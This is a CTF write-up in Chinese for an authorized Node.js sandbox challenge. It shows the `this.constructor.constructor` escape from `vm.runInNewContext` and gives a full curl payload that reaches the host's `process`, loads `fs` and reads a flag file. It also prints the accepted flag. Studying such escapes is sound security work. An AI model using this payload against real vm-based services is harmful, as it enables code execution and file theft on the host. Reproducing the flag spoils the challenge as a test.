## 题目原文

> 某平台提供在线 JavaScript 脚本执行服务，脚本在隔离的执行上下文中运行。已获授权进行安全评估，请在该限制下设法读取系统中隐藏的 flag。

## 题解

### 入口与指纹

8000 端口，`X-Powered-By: Express`。`GET /` 的 JSON 写明沙箱是 `nodejs-vm-module`，也就是 `vm.runInNewContext`。POST `{"code": "..."}`，最多 4096 字符。上下文里预先放进的名字只有 `console`、`setTimeout`、`setInterval`、`setImmediate`、`Promise`。

### 关键观察

沙箱里的 `process` 是 `undefined`，`Object.keys(this)` 也只有那五个名字。但上下文里的函数对象仍然连着宿主的 `Function` 构造器。

```javascript
this.constructor.constructor("return process")()
```

`this.constructor` 是沙箱里的 `Object`，再取一次 `constructor` 就是宿主的 `Function`。用它编译的函数在宿主上执行，返回值是宿主的 `process`，`console.log` 打印出来是 `[object process]`。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -H 'Content-Type: application/json' \
  --data-binary '{"code":"console.log(this.constructor.constructor(\"return process\")().mainModule.require(\"fs\").readFileSync(\"/challenge/flag1.txt\",\"utf8\"))"}' \
  "http://$T/"
```

`/challenge` 目录里只有 `flag1.txt`。本次平台接受的值是 `flag{40f470fb-2b71-41e2-910d-599066d3591a}`。

### flag 位置

入口容器的 `/challenge/flag1.txt`。读取用的是逃逸之后的 `process.mainModule.require("fs")`，不是沙箱预置的那五个名字。
